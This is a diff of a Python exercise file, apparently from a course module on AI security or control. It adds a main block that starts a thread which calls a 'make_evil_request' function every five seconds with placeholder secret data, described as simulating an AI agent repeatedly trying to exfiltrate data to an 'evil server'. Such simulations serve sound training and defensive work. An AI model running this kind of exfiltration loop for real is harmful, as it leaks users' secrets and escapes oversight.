@@ -48,13 +48,30 @@ def make_evil_request(secret_data: str) -> Optional[str]:
         return None
 
 
-# from w1d2_test import test_make_evil_request
-import w1d2_test
-
+"""import w1d2_test
 w1d2_test.test_make_evil_request(make_evil_request)
+exfiltrate_data = make_evil_request"""
 
-exfiltrate_data = make_evil_request
 
-#
+if __name__ == "__main__":  # Only executed when running the script directly
+    """
+    Make requests to the evil server with different secret data.
+    This simulates an AI agent repeatedly trying to exfiltrate data.
+    """
+
+    def loop_exfiltration():
+        while True:
+            global exfiltrate_data
+            try:
+                time.sleep(5)
+                print(exfiltrate_data("some_secret_data"))
+            except KeyboardInterrupt:
+                print("Stopping exfiltration loop.")
+                break
+
+    import threading
+
+    thread = threading.Thread(target=loop_exfiltration)
+    thread.start()
 
 # %%
